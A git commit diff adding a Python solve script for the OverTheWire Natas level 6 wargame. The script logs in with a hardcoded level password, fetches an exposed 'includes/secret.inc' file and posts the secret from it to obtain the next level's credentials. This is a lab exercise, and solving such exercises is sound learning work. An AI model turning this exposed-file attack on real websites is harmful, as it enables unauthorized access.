ddbcec560b1d312158807293870292c273403cd5
Hoang Viet Anh <vietanh092004@gmail.com>
2024-06-20 07:50:00 +0700

    Fix: natas6.md

--- natas6/solve.py
+++ natas6/solve.py
@@ -2,7 +2,20 @@ import requests
 
 url = 'http://natas6.natas.labs.overthewire.org/'
 s = requests.Session()
-s.auth = ('natas6', 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr')
+s.auth = ('natas6', '0RoJwHdSKWFTYR5WuiAewauSuNaBXned')
 r = s.get(url)
-
 print(r.text)
+print('--------------------------------------')
+suburl = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
+r = s.get(suburl)
+secret = 'FOEIUWGHFEEUHOFUOIU'
+data = {'secret': secret,
+        'submit': 'Submit+Query'
+        }
+print(r.text)
+print('--------------------------------------')
+r = s.post(url, data=data)
+print(r.text)
+
+
+
